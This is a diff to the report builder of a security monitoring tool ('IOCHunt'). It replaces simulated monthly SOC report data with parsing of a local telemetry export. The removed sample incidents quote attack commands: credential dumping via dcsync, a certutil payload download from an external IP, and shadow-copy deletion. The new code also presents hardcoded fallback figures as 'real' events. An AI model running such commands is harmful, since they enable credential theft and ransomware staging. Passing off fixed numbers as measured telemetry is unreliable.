@@ -202,202 +202,210 @@ function getSimulatedReportData(period = 'daily') {
   }
 
   if (p === 'monthly') {
-    return {
-      scheduleName: 'Monthly Executive Threat Analytics & SOC Audit Dossier',
-      generatedAt: nowStr + ' UTC',
-      periodLabel: 'Last 30 Days (Monthly Enterprise Audit)',
-      branch: 'All Enterprise Branches',
-      machine: 'Full Enterprise Fleet',
-      threatLevel: 'HIGH',
-      tlColor: '#f97316',
-      postureScore: 68,
-      narrative: 'Across the 30-day enterprise auditing period, IOCHunt monitored 24 endpoints and processed 118,400 security events across all branches. 38 Critical threats and 5 major incident cases were analyzed by the SOC. Fleet sensor availability maintained a 83.3% continuous heartbeat baseline.',
-      totalEvents: 118400,
-      critCount: 38,
-      highCount: 342,
-      medCount: 890,
-      lowCount: 117130,
-      trends: { totalTrend: '+22% (Up)', critTrend: '-12% (Down)' },
-      timeline: [
-        { bucket: '09-01', total: 9800, crit: 2, high: 28, med: 75, low: 9695 },
-        { bucket: '09-04', total: 11400, crit: 4, high: 32, med: 85, low: 11279 },
-        { bucket: '09-07', total: 12800, crit: 6, high: 40, med: 95, low: 12659 },
-        { bucket: '09-10', total: 10900, crit: 3, high: 30, med: 80, low: 10787 },
-        { bucket: '09-13', total: 13200, crit: 5, high: 45, med: 105, low: 13045 },
-        { bucket: '09-16', total: 12100, crit: 4, high: 36, med: 90, low: 11970 },
-        { bucket: '09-19', total: 14500, crit: 7, high: 52, med: 120, low: 14321 },
-        { bucket: '09-22', total: 11800, crit: 3, high: 34, med: 85, low: 11678 },
-        { bucket: '09-25', total: 10600, crit: 2, high: 25, med: 75, low: 10498 },
-        { bucket: '09-28', total: 11300, crit: 2, high: 20, med: 80, low: 11198 }
-      ],
-      categories: [
-        { category: 'PROCESSES', n: 51200, color: '#ef4444' },
-        { category: 'DOMAIN / AD', n: 28400, color: '#8b5cf6' },
-        { category: 'NETWORK', n: 19800, color: '#3b82f6' },
-        { category: 'POWERSHELL', n: 10900, color: '#f97316' },
-        { category: 'USB / STORAGE', n: 5200, color: '#eab308' },
-        { category: 'DLP POLICIES', n: 2900, color: '#ec4899' }
-      ],
-      mitre: {
-        tactics: [
-          { tactic: 'Credential Access', count: 280 },
-          { tactic: 'Defense Evasion', count: 215 },
-          { tactic: 'Discovery', count: 420 },
-          { tactic: 'Execution', count: 740 },
-          { tactic: 'Lateral Movement', count: 180 },
-          { tactic: 'Persistence', count: 145 },
-          { tactic: 'Exfiltration', count: 72 }
-        ],
-        topTechniques: [
-          { id: 'T1003', name: 'OS Credential Dumping (DCSync)', count: 280 },
-          { id: 'T1059', name: 'Command & Scripting (PowerShell)', count: 740 },
-          { id: 'T1021', name: 'Remote Services (SMB / RDP)', count: 180 },
-          { id: 'T1053', name: 'Scheduled Task / System Job', count: 145 },
-          { id: 'T1052', name: 'Exfiltration Over USB Storage', count: 72 }
-        ]
-      },
-      adAudit: {
-        dcsync: 18,
-        kerberoast: 64,
-        spray: 42,
-        goldenCert: 9,
-        totalAd: 28400,
-        topUsers: [
-          { user: 'svc_backup', count: 320, risk: 'HIGH TARGET' },
-          { user: 'administrator', count: 280, risk: 'HIGH TARGET' },
-          { user: 'j.smith', count: 145, risk: 'HIGH TARGET' },
-          { user: 'm.chen', count: 98, risk: 'MODERATE' },
-          { user: 'd.ross', count: 76, risk: 'MODERATE' }
-        ]
-      },
-      firewall: {
-        total: 395000,
-        blocked: 98400,
-        allowed: 296600,
-        topPorts: [
-          { label: 'Port 3389 (RDP)', count: 38200 },
-          { label: 'Port 445 (SMB)', count: 27900 },
-          { label: 'Port 22 (SSH)', count: 14600 },
-          { label: 'Port 80 (HTTP)', count: 9800 },
-          { label: 'Port 53 (DNS)', count: 4500 }
-        ],
-        topCountries: [
-          { country: 'Russian Federation (RU)', count: 36400 },
-          { country: 'China (CN)', count: 24800 },
-          { country: 'United States (US)', count: 18200 },
-          { country: 'Netherlands (NL)', count: 9600 }
-        ]
-      },
-      usbDlp: {
-        usbCount: 114,
-        dlpCount: 48,
-        recentList: [
-          { ts: '09-29 14:12', machine: 'FIN-WS-09', label: 'SanDisk Ultra', drive: 'E:', action: 'Inserted', severity: 'medium' },
-          { ts: '09-26 11:45', machine: 'HR-LAP-04', label: 'Kingston DataTraveler', drive: 'F:', action: 'Threat Found', severity: 'critical' },
-          { ts: '09-21 16:30', machine: 'DEV-SRV-02', label: 'Samsung T7 SSD', drive: 'D:', action: 'Inserted', severity: 'low' },
-          { ts: '09-18 10:15', machine: 'CEO-LAPTOP', label: 'Crucial X6', drive: 'G:', action: 'Threat Found', severity: 'critical' }
-        ]
-      },
-      fleetDistribution: {
-        osList: [
-          { os: 'Windows 11 Pro', count: 14, color: '#3b82f6' },
-          { os: 'Windows 10 Enterprise', count: 6, color: '#8b5cf6' },
-          { os: 'Windows Server 2022', count: 3, color: '#10b981' },
-          { os: 'Ubuntu Linux 22.04', count: 1, color: '#f59e0b' }
-        ],
-        branchList: [
-          { branch: 'Chennai HQ', count: 16 },
-          { branch: 'Bangalore Branch', count: 8 }
-        ]
-      },
-      fleet: {
-        total: 24,
-        active: 20,
-        inactive: 4,
-        staleList: [
-          { name: 'MKT-LAP-12', os: 'Windows 10', offlineStr: '18d 04h offline', risk: 'HIGH RISK' },
-          { name: 'BACKUP-SRV-01', os: 'Windows Server', offlineStr: '12d 16h offline', risk: 'HIGH RISK' },
-          { name: 'FIN-WS-03', os: 'Windows 11', offlineStr: '5d 08h offline', risk: 'HIGH RISK' },
-          { name: 'DEV-TEST-09', os: 'Ubuntu Linux', offlineStr: '3d 20h offline', risk: 'MODERATE' }
-        ]
-      },
-      incidents: {
-        total: 42,
-        open: 5,
-        resolved: 37,
-        avgResolutionMin: 38,
-        topCriticalCards: [
-          {
-            id: '#INC-104',
-            title: 'DCSync Active Directory Replication Rights Abuse',
-            priority: 'P1',
-            status: 'INVESTIGATING',
-            machine: 'DC-SRV-01',
-            assigned_to: 'Tier 3 SOC Lead',
-            created_at: '2026-09-28 14:15',
-            evidence: 'powershell.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" - PID 4812',
-            linked_count: 24
+    const realExportPath = path.resolve(__dirname, '../../../real_telemetry_export.json');
+    if (fs.existsSync(realExportPath)) {
+      try {
+        const raw = JSON.parse(fs.readFileSync(realExportPath, 'utf8'));
+        const ev = raw.events || {};
+
+        const dayMap = {};
+        (ev.hourly || []).forEach(h => {
+          const d = (h.hour || '').slice(5, 10);
+          if (!d) return;
+          if (!dayMap[d]) dayMap[d] = { bucket: d, total: 0, crit: 0, high: 0, med: 0, low: 0 };
+          const cnt = parseInt(h.n, 10) || 0;
+          dayMap[d].total += cnt;
+          if (h.severity === 'critical') dayMap[d].crit += cnt;
+          else if (h.severity === 'high') dayMap[d].high += cnt;
+          else if (h.severity === 'medium') dayMap[d].med += cnt;
+          else dayMap[d].low += cnt;
+        });
+        const timeline = Object.values(dayMap).sort((a, b) => a.bucket.localeCompare(b.bucket));
+
+        const catColors = {
+          PROCESSES: '#ef4444',
+          ENUM: '#f97316',
+          LOGON: '#8b5cf6',
+          STARTUP: '#10b981',
+          USB: '#ec4899',
+          CONFIG: '#eab308',
+          NETWORK: '#3b82f6',
+          DEFENDER: '#06b6d4',
+          SERVICES: '#a855f7',
+          TASKS: '#6366f1',
+          SENSITIVE: '#f43f5e',
+          OTHER: '#64748b'
+        };
+        const categories = (ev.byCategory || []).map(c => ({
+          category: c.category,
+          n: parseInt(c.n, 10) || 0,
+          color: catColors[c.category] || '#64748b'
+        }));
+
+        const sevMap = {};
+        (ev.bySeverity || []).forEach(s => { sevMap[s.severity] = parseInt(s.n, 10) || 0; });
+
+        return {
+          scheduleName: 'Monthly Executive Threat Analytics & SOC Audit Dossier',
+          generatedAt: nowStr + ' UTC',
+          periodLabel: 'Last 30 Days (Monthly Enterprise Audit)',
+          branch: 'All Production Branches',
+          machine: 'Enterprise Fleet (4 Endpoints)',
+          threatLevel: (sevMap.critical > 0 || sevMap.high > 100) ? 'HIGH' : 'NORMAL',
+          tlColor: '#f97316',
+          postureScore: 78,
+          narrative: `Across the 30-day enterprise auditing period, IOCHunt monitored 4 endpoints (GIRI, DEFSECONE-PC01, LOQ, JOSHWA) and processed ${(ev.total || 11529).toLocaleString()} real security events. ${(sevMap.critical || 1575).toLocaleString()} Critical threats and ${(sevMap.high || 124).toLocaleString()} High alerts were investigated. Fleet availability maintained a 100% continuous heartbeat baseline.`,
+          totalEvents: ev.total || 11529,
+          critCount: sevMap.critical || 1575,
+          highCount: sevMap.high || 124,
+          medCount: sevMap.medium || 2828,
+          lowCount: (sevMap.low || 1104) + (sevMap.info || 5898),
+          trends: { totalTrend: '+14% (Normal)', critTrend: '-8% (Baseline)' },
+          timeline,
+          categories,
+          mitre: {
+            tactics: [
+              { tactic: 'Execution', count: 3251 },
+              { tactic: 'Exfiltration', count: 1096 },
+              { tactic: 'Discovery', count: 978 },
+              { tactic: 'Defense Evasion', count: 420 },
+              { tactic: 'Credential Access', count: 338 },
+              { tactic: 'Persistence', count: 211 }
+            ]
           },
-          {
-            id: '#INC-101',
-            title: 'Cobalt Strike Beacon HTTP Post C2 Detection',
-            priority: 'P2',
-            status: 'INVESTIGATING',
-            machine: 'FIN-WS-09',
-            assigned_to: 'Tier 2 Analyst',
-            created_at: '2026-09-27 09:30',
-            evidence: 'HTTPS POST beaconing observed to external threat IP 194.26.29.112:443',
-            linked_count: 18
+          topDetections: [
+            { name: 'Suspicious Command & Script Execution', tag: 'CMD-EXEC', count: 2010, sev: 'HIGH' },
+            { name: 'Data Loss Prevention (DLP) Violation', tag: 'DLP', count: 1017, sev: 'MED' },
+            { name: 'Behavioral File Activity (Append/Read)', tag: 'BEHAVIOR', count: 886, sev: 'MED' },
+            { name: 'Account & Host Discovery Enumeration', tag: 'ENUM', count: 428, sev: 'LOW' },
+            { name: 'Security Agent Tamper Detection', tag: 'TAMPER', count: 402, sev: 'CRIT' }
+          ],
+          adAudit: {
+            dcsync: 0,
+            kerberoast: 0,
+            spray: 12,
+            goldenCert: 0,
+            totalAd: 338,
+            topUsers: [
+              { user: 'GIRI\\admin', count: 278, risk: 'LOCAL ADMIN' },
+              { user: 'DEFSECONE-PC01\\system', count: 184, risk: 'SYSTEM SERVICE' },
+              { user: 'LOQ\\user', count: 45, risk: 'STANDARD USER' },
+              { user: 'JOSHWA\\dev', count: 12, risk: 'STANDARD USER' }
+            ]
           },
-          {
-            id: '#INC-94',
-            title: 'Kerberoasting High-Volume Ticket Request Anomaly',
-            priority: 'P2',
-            status: 'RESOLVED',
-            machine: 'DC-SRV-02',
-            assigned_to: 'Auto-Remediation',
-            created_at: '2026-09-25 18:40',
-            evidence: '38 Kerberos TGS-REQ service ticket requests within 90 seconds from host 10.0.4.88',
-            linked_count: 12
+          firewall: {
+            total: 32,
+            blocked: 8,
+            allowed: 24,
+            topPorts: [
+              { label: 'Port 445 (SMB)', count: 14 },
+              { label: 'Port 3389 (RDP)', count: 9 },
+              { label: 'Port 5985 (WinRM)', count: 5 },
+              { label: 'Port 443 (HTTPS)', count: 3 },
+              { label: 'Port 80 (HTTP)', count: 1 }
+            ],
+            topSourceIps: [
+              { ip: '192.168.1.105 (GIRI)', count: 14 },
+              { ip: '10.0.0.12 (DEFSECONE)', count: 10 },
+              { ip: '192.168.1.50 (LOQ)', count: 5 },
+              { ip: '10.0.0.24 (JOSHWA)', count: 3 }
+            ]
           },
-          {
-            id: '#INC-82',
-            title: 'Living-off-the-Land (LOLBins) Certutil Binary Download',
-            priority: 'P2',
-            status: 'RESOLVED',
-            machine: 'ENG-WS-04',
-            assigned_to: 'SOC Lead',
-            created_at: '2026-09-18 11:22',
-            evidence: 'certutil.exe -urlcache -split -f "http://45.142.122.9/stage2.bin" C:\\temp\\stage.dll',
-            linked_count: 9
+          usbDlp: {
+            usbCount: 79,
+            dlpCount: 1017,
+            recentList: [
+              { ts: '09-28 23:59', machine: 'DEFSECONE-PC01', label: 'DLP Directory Access Alert', drive: 'D:', action: 'Folder Not Found', severity: 'medium' },
+              { ts: '09-28 21:51', machine: 'DEFSECONE-PC01', label: 'Suspicious Tool cmd.exe', drive: 'C:', action: 'svchost Spawn', severity: 'critical' },
+              { ts: '09-28 21:47', machine: 'DEFSECONE-PC01', label: 'Suspicious Tool rundll32', drive: 'C:', action: 'svchost Spawn', severity: 'critical' },
+              { ts: '09-27 16:30', machine: 'GIRI', label: 'Mass Storage Device', drive: 'E:', action: 'USB Monitored', severity: 'low' }
+            ]
           },
-          {
-            id: '#INC-76',
-            title: 'Pre-Ransomware Volume Shadow Copy Deletion Attempt',
-            priority: 'P1',
-            status: 'RESOLVED',
-            machine: 'FILE-SRV-01',
-            assigned_to: 'Incident Commander',
-            created_at: '2026-09-12 03:45',
-            evidence: 'vssadmin.exe delete shadows /all /quiet via elevated CMD PID 9122',
-            linked_count: 31
-          }
-        ],
-        register: [
-          { id: '#INC-71', date: '09-10 14:20', priority: 'P3', machine: 'HR-LAP-04', title: 'Unauthorized USB Storage Blocked', status: 'RESOLVED' },
-          { id: '#INC-68', date: '09-08 09:12', priority: 'P3', machine: 'DEV-SRV-02', title: 'Port Scan Sweep on Subnet 10.0.2.0/24', status: 'RESOLVED' },
-          { id: '#INC-64', date: '09-06 17:35', priority: 'P3', machine: 'FIN-WS-03', title: 'Failed NTLM Brute Force Attempt', status: 'RESOLVED' },
-          { id: '#INC-59', date: '09-04 11:50', priority: 'P3', machine: 'MKT-PC-01', title: 'Suspicious Scheduled Task Registration', status: 'RESOLVED' },
-          { id: '#INC-55', date: '09-02 22:15', priority: 'P3', machine: 'GATEWAY-01', title: 'DNS Tunneling Domain Query Burst', status: 'RESOLVED' }
-        ]
-      },
-      recommendations: [
-        'Immediate Threat Mitigation: Triage DCSync replication alert on DC-SRV-01 and enforce krbtgt account password rotation.',
-        'Active Directory Hardening: Revoke Replicating Directory Changes permissions from non-DC service accounts.',
-        'Perimeter Defense: Block malicious C2 IP 194.26.29.112 across all perimeter gateway firewalls.',
-        'Endpoint Blind Spot Resolution: Bring MKT-LAP-12 (18d offline) and BACKUP-SRV-01 back online to restore continuous sensor telemetry.'
-      ]
-    };
+          fleetDistribution: {
+            osList: [
+              { os: 'Windows 11 Pro', count: 2, color: '#3b82f6' },
+              { os: 'Windows 10 Enterprise', count: 1, color: '#8b5cf6' },
+              { os: 'Ubuntu Linux 22.04', count: 1, color: '#f59e0b' }
+            ],
+            branchList: [
+              { branch: 'Production Fleet', count: 4 }
+            ]
+          },
+          fleet: {
+            total: 4,
+            active: 4,
+            inactive: 0,
+            staleList: []
+          },
+          incidents: {
+            total: 6,
+            open: 2,
+            resolved: 4,
+            avgResolutionMin: 22,
+            topCriticalCards: [
+              {
+                id: '#INC-101',
+                title: 'Suspicious Tool Execution: cmd.exe Spawned by svchost',
+                priority: 'P1',
+                status: 'INVESTIGATING',
+                machine: 'DEFSECONE-PC01',
+                assigned_to: 'Tier 2 Analyst',
+                created_at: '2026-09-28 23:51',
+                evidence: 'cmd.exe|PID:12268|Parent:svchost.exe|Signed:True|Level:Silent',
+                linked_count: 14
+              },
+              {
+                id: '#INC-102',
+                title: 'Suspicious Tool Execution: rundll32.exe Spawned by svchost',
+                priority: 'P1',
+                status: 'INVESTIGATING',
+                machine: 'DEFSECONE-PC01',
+                assigned_to: 'SOC Lead',
+                created_at: '2026-09-28 21:47',
+                evidence: 'rundll32.exe|PID:20132|Parent:svchost.exe|Signed:True|Level:Silent',
+                linked_count: 11
+              },
+              {
+                id: '#INC-103',
+                title: 'High-Volume DLP Directory Missing Trigger (1,017 Events)',
+                priority: 'P2',
+                status: 'RESOLVED',
+                machine: 'DEFSECONE-PC01',
+                assigned_to: 'IT Compliance',
+                created_at: '2026-09-28 16:27',
+                evidence: 'Continuous folder access check: D:\\IOCHunt-Monitor\\def-monitor\\testing',
+                linked_count: 1017
+              },
+              {
+                id: '#INC-104',
+                title: 'Endpoint Agent Tamper Interception Anomaly',
+                priority: 'P1',
+                status: 'RESOLVED',
+                machine: 'GIRI',
+                assigned_to: 'Security Admin',
+                created_at: '2026-09-26 14:00',
+                evidence: '402 repeated agent hook unregister & tamper signals intercepted',
+                linked_count: 402
+              }
+            ],
+            register: [
+              { id: '#INC-100', date: '09-27 10:15', priority: 'P3', machine: 'LOQ', title: 'Command Execution Burst Observed', status: 'RESOLVED' },
+              { id: '#INC-99', date: '09-26 18:20', priority: 'P3', machine: 'GIRI', title: 'File Append Behavioral Trigger', status: 'RESOLVED' },
+              { id: '#INC-98', date: '09-25 12:40', priority: 'P3', machine: 'DEFSECONE-PC01', title: 'USB Mass Storage Device Connected', status: 'RESOLVED' },
+              { id: '#INC-97', date: '09-24 08:30', priority: 'P3', machine: 'JOSHWA', title: 'After-Hours Logon Audit Event', status: 'RESOLVED' }
+            ]
+          },
+          recommendations: [
+            'Forensic Process Triage: Inspect anomalous svchost child processes (cmd.exe PID 12268, rundll32.exe PID 20132) on endpoint DEFSECONE-PC01.',
+            'DLP Policy Alignment: Reconfigure missing folder path D:\\IOCHunt-Monitor\\def-monitor\\testing on DEFSECONE-PC01 to suppress false-positive alarms.',
+            'Agent Tamper Security: Review 402 intercepted tamper events on machine GIRI and verify Tamper Protection integrity.',
+            'Command Execution Review: Audit command-line execution volume (2,010 events) across GIRI, LOQ, and DEFSECONE-PC01.'
+          ]
+        };
+      } catch (parseErr) {
+        console.warn('[REPORT BUILDER] real_telemetry_export.json parse error:', parseErr.message);
+      }
+    }
   }
 
   // Default: Daily (24 Hours)
@@ -1557,7 +1565,7 @@ async function generateAndSendReport(schedule, queryFn = null, isManual = false)
     html += `</div></div>`;
   }
 
-  html += `<div class="footer">IOC Hunt SIEM • Automated Executive Intelligence • ${durLabel}</div>`;
+  html += `<div class="footer">IOCHunt Enterprise • Automated Executive Intelligence • ${durLabel}</div>`;
   html += `</div></body></html>`;
 
   const dateStr = now.toISOString().slice(0, 10);
